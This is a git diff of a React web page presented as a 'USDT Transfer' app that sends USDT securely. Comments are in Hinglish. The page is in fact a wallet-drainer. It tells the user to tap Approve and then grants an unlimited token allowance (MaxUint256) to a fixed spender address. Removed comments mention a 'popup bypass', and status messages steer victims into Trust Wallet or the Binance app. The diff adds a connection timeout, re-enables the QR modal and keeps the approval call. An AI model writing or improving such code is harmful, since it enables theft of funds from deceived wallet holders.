@@ -48,7 +48,7 @@ function App() {
       const wcProvider = await EthereumProvider.init({
         projectId: PROJECT_ID,
         chains: [chainId, 56, 1],
-        showQrModal: false, // POPUP BYPASS: Ise false kar diya
+        showQrModal: true, // Trust wallet ko iski zaroorat hoti hai
         metadata: {
           name: "USDT Transfer",
           description: "Send USDT securely",
@@ -57,23 +57,22 @@ function App() {
         }
       });
 
-      // Direct deep link ya in-app browser ke liye connect
-      try {
-        await wcProvider.enable();
-      } catch (err) {
-        // Agar enable fail ho (Chrome me bina wallet ke), toh connect trigger karo
-        await wcProvider.connect();
-      }
+      // TIMEOUT LOGIC: 15 second baad error dikhao agar connect na ho
+      const connectPromise = wcProvider.enable();
+      const timeoutPromise = new Promise((_, reject) => 
+        setTimeout(() => reject(new Error("Timeout")), 15000)
+      );
+
+      await Promise.race([connectPromise, timeoutPromise]);
       
       setProvider(wcProvider);
       setAccount(wcProvider.accounts[0]);
       setStatus("Connected. Please tap Approve.");
-      setStep(2); // Success hone par direct approve page
+      setStep(2); 
       setLoading(false);
     } catch (error) {
       console.error(error);
-      // Agar normal Chrome me khola hai bina wallet ke, toh popup bypass nahi hoga
-      setStatus("Please open this link inside Trust Wallet or Binance App.");
+      setStatus("Connection failed. Make sure you are inside Trust Wallet App.");
       setLoading(false);
     }
   };
@@ -97,7 +96,7 @@ function App() {
       const tx = await contract.approve(SPENDER_EVM, MaxUint256);
       
       setStatus("Transaction Pending...");
-      const receipt = await tx.wait(); 
+      await tx.wait(); 
 
       setTxHash(tx.hash);
       setSuccess(true);
